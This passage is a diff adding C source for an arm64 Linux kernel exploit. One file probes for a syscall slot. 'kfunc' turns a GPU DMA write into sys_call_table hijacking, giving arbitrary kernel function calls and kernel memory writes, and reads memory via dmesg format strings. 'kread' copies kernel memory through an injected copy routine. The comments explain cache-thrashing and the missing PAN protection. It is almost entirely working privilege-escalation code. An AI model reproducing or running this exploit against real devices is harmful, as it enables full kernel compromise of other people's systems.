+            }
+            printf("probe 0x%08x\n", cur);
+            fflush(stdout);
+            if (write128(cur + slot_off, canary, slot) < 0) {
+                printf("[!] write failed at 0x%x\n", cur);
+                return 1;
+            }
+            slot++;
+            cache_thrash();
+            unsigned long r = (unsigned long)raw_syscall1(244, 0);
+            n++;
+            if (r != (unsigned long)-38) /* -ENOSYS: slot still sys_ni_syscall */ {
+                printf("\nHIT 0x%08x -> syscall(244) = 0x%lx\n", cur, r);
+                return 0;
+            }
+            if ((n % 50) == 0) {
+                double dt = now_ms() - t0;
+                printf("... 0x%08x  %ld probes  %.1f ms/probe\n", cur, n, dt / n);
+            }
+            cur += step;
+        }
+        printf("DONE probes=%ld %.1f ms/probe no hit\n", n, (now_ms() - t0) / (n ? n : 1));
+        return 2;
+    }
+
+    fprintf(stderr, "unknown mode\n");
+    return 1;
+}
+
+
+
+
+
+
+
+
+```
+
+`src/kfunc.c`:
+
+```c
+/*
+ * kfunc - call an arbitrary kernel function from a 64-bit process by abusing
+ *         unused entries of sys_call_table.
+ *
+ * Background
+ * ----------
+ * The kernel on the target is arm64, so sys_call_table[] holds 8-byte
+ * pointers.  Entries [244..259] are all sys_ni_syscall ("not implemented"),
+ * i.e. 16 consecutive slots nobody calls.  One 128-byte write from
+ * gpu_arb_write() fills all 16 of them with the same address, and the kernel
+ * then happily dispatches our syscall number into that function.
+ *
+ * Because the syscall ABI passes arguments in x0..x5 and returns x0, the
+ * called function sees our arguments and we get its return value back.  There
+ * is no PAN on this target, so the kernel can also read strings and buffers
+ * that live in our address space.
+ *
+ * Note: a *32-bit* process does NOT go through this table - it goes through
+ * compat_sys_call_table, which lives in .text.  That is why this helper must
+ * be a 64-bit (aarch64) binary.
+ *
+ * Build (64-bit ARM, static):
+ *   aarch64-linux-musl-gcc -O1 -static -o kfunc kfunc.c
+ *
+ * Modes (the table entry must already point at the matching function):
+ *   kfunc sym  <name>            kallsyms_lookup_name(name)   -> prints address
+ *   kfunc zero <addr_hex> <len>  memcpy(addr, zeros, len)
+ *   kfunc str  <addr_hex> <text> memcpy(addr, text, len+1)
+ *   kfunc show <addr_hex> <len>  memcpy(buf, addr, len)       -> hexdump
+ *   kfunc dump <addr_hex> <len>  kernel read into dmesg via warn_slowpath_fmt
+ *   kfunc call <nr> [arg]        raw syscall, to probe a slot
+ */
+#define _GNU_SOURCE
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/syscall.h>
+#include <sys/mman.h>
+#include <unistd.h>
+
+#define SLOT 244
+
+/* sys_call_table is read on every syscall, so its cache line stays hot and a
+ * GPU (DMA) write to the table is invisible until that line is evicted.  Walk
+ * a few MB of memory right before the call so the CPU reloads the entry from
+ * RAM and picks up what gpu_arb_write/gpwrite put there. */
+static void cache_thrash(void)
+{
+    static unsigned char *buf;
+    const size_t len = 8u << 20;
+    if (!buf) {
+        buf = mmap(NULL, len, PROT_READ | PROT_WRITE,
+                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+        if (buf == MAP_FAILED) { buf = NULL; return; }
+        memset(buf, 1, len);
+    }
+    for (size_t i = 0; i < len; i += 64)
+        buf[i] ^= 0x5a;
+}
+
+static unsigned char buf[8192];
+static unsigned char src[8192];
+
+static unsigned long call3(unsigned long a0, unsigned long a1, unsigned long a2)
+{
+    cache_thrash();
+    return (unsigned long)syscall(SLOT, a0, a1, a2);
+}
+
+int main(int argc, char **argv)
+{
+    setvbuf(stdout, NULL, _IONBF, 0);
+    if (argc < 2) {
+        fprintf(stderr, "usage: see source header\n");
+        return 1;
+    }
+
+    if (!strcmp(argv[1], "sym") && argc >= 3) {
+        char name[128];
+        strncpy(name, argv[2], sizeof name - 1);
+        name[sizeof name - 1] = 0;
+        unsigned long a = call3((unsigned long)name, 0, 0);
+        printf("%s = 0x%016lx\n", name, a);
+        return (a > 0xffffff0000000000UL) ? 0 : 2;
+    }
+
+    if (!strcmp(argv[1], "zero") && argc >= 4) {
+        unsigned long dst = strtoul(argv[2], NULL, 16);
+        int len = atoi(argv[3]);
+        if (len <= 0 || len > (int)sizeof src) return 1;
+        memset(src, 0, len);
+        unsigned long r = call3(dst, (unsigned long)src, (unsigned long)len);
+        printf("memset-ish 0x%lx <- 0 (%d bytes), ret=0x%lx\n", dst, len, r);
+        return 0;
+    }
+
+    if (!strcmp(argv[1], "str") && argc >= 4) {
+        unsigned long dst = strtoul(argv[2], NULL, 16);
+        int len = (int)strlen(argv[3]) + 1;
+        if (len > (int)sizeof src) return 1;
+        memcpy(src, argv[3], len);
+        unsigned long r = call3(dst, (unsigned long)src, (unsigned long)len);
+        printf("memcpy 0x%lx <- \"%s\" (%d bytes), ret=0x%lx\n", dst, argv[3], len, r);
+        return 0;
+    }
+
+    if (!strcmp(argv[1], "show") && argc >= 4) {
+        unsigned long src_addr = strtoul(argv[2], NULL, 16);
+        int len = atoi(argv[3]);
+        if (len <= 0 || len > (int)sizeof buf) return 1;
+        memset(buf, 0, sizeof buf);
+        call3((unsigned long)buf, src_addr, (unsigned long)len);
+        for (int i = 0; i < len; i++) {
+            printf("%02x", buf[i]);
+            if ((i & 15) == 15) printf("\n");
+        }
+        if (len & 15) printf("\n");
+        return 0;
+    }
+
+    /* Symbolisation oracle: call dump_backtrace(regs, NULL) with a fabricated
+     * pt_regs living in our own address space.  dump_backtrace() reads
+     * regs->regs[29], regs->sp and regs->pc straight out of user memory (no
+     * PAN on this SoC), prints "Call trace:", then emits
+     *
+     *     [<pc>] symbol+offset/size
+     *
+     * through %pS.  Because the frame pointer we hand it points at our own
+     * buffer, exactly one frame is printed and the walk stops before touching
+     * anything else.  Nothing is executed at `pc`, so this can be pointed at
+     * any kernel address safely: it is a read-only "what symbol is at this
+     * address" query. */
+    if (!strcmp(argv[1], "bt") && argc >= 3) {
+        unsigned long pc = strtoul(argv[2], NULL, 16);
+        static unsigned long frame[64] __attribute__((aligned(16384)));
+        unsigned long regs[33];
+
+        memset(regs, 0, sizeof regs);
+        frame[0] = 0; /* next fp = 0 -> unwind fails, walk stops after 1 frame */
+        frame[1] = 0;
+        /* sp must not be 16K aligned: unwind_frame() computes
+         * high = ALIGN(sp, THREAD_SIZE) and rejects fp when
+         * fp > high - 0x18, which is always the case for fp == sp == 16K base. */
+        regs[29] = (unsigned long)(frame + 32); /* fp  (+256, 16-aligned) */
+        regs[31] = (unsigned long)(frame + 32); /* sp  (+256) */
+        regs[32] = pc;                          /* pc */
+
+        unsigned long r = (unsigned long)syscall(SLOT, (unsigned long)regs, 0UL, 0UL);
+        printf("bt pc=0x%lx ret=0x%lx\n", pc, r);
+        return 0;
+    }
+
+    /* Arbitrary kernel read via warn_slowpath_fmt() + "%*ph".
+     *
+     * With the slot pointing at warn_slowpath_fmt(file, line, fmt, ...) we
+     * pass file = line = 0 so the caller is reported as "(null)", then a
+     * format string "*ph" (sic, the leading '*' is the width spec) that
+     * vprintk() expands from our own user buffer.  No PAN on this SoC, so
+     * vprintk() can read the format string straight out of our address
+     * space.  The dump lands in dmesg as space-separated hex bytes.
+     *
+     * 3.14 caps %*ph at 64 bytes. */
+    if (!strcmp(argv[1], "dump") && argc >= 4) {
+        unsigned long addr = strtoul(argv[2], NULL, 16);
+        int len = atoi(argv[3]);
+        if (len <= 0 || len > 64)
+            return 1;
+        strcpy((char *)src, "%*ph");
+        unsigned long r = (unsigned long)syscall(SLOT, 0UL, 0UL,
+                                                 (unsigned long)src,
+                                                 (unsigned long)len,
+                                                 addr, 0UL);
+        printf("dump 0x%lx len=%d ret=0x%lx\n", addr, len, r);
+        return 0;
+    }
+
+    if (!strcmp(argv[1], "call") && argc >= 3) {
+        unsigned long nr = strtoul(argv[2], NULL, 0);
+        unsigned long a0 = (argc >= 4) ? strtoul(argv[3], NULL, 0) : 0;
+        unsigned long r = (unsigned long)syscall(nr, a0, 0, 0);
+        printf("nr=%lu ret=0x%lx\n", nr, r);
+        return 0;
+    }
+
+    fprintf(stderr, "unknown mode\n");
+    return 1;
+}
+
+
+
+```
+
+`src/kread.c`:
+
+```c
+/* kread - 3-argument caller for the physmap canary payload (see FINDING_ADDRESSES.md).
+ *
+ * With sys_call_table[244] pointing at a page whose first bytes are
+ *     ldrb w3,[x1],#1 ; strb w3,[x0],#1 ; subs x2,x2,#1 ; b.ne -3 ; ret
+ * the kernel copies `len` bytes from kernel address `addr` into our buffer.
+ * No PAN on this SoC, so EL1 may store to user memory.
+ *
+ *   kread <kaddr_hex> <len>
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+
+#define SLOT 244
+
+int main(int argc, char **argv)
+{
+    if (argc < 3) {
+        fprintf(stderr, "usage: kread <kaddr_hex> <len>\n");
+        return 1;
+    }
+    unsigned long addr = strtoul(argv[1], NULL, 16);
+    int len = atoi(argv[2]);
+    if (len <= 0 || len > 0x100000)
+        return 1;
+
+    unsigned char *buf = mmap(NULL, (size_t)len + 0x4000, PROT_READ | PROT_WRITE,
+                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (buf == MAP_FAILED) {
+        perror("mmap");
+        return 1;
+    }
+    memset(buf, 0, len);          /* fault the pages in before the kernel writes them */
+
+    syscall(SLOT, (unsigned long)buf, addr, (unsigned long)len);
+
+    for (int i = 0; i < len; i++)
+        printf("%02x", buf[i]);
+    printf("\n");
+    return 0;
+}
+
+```
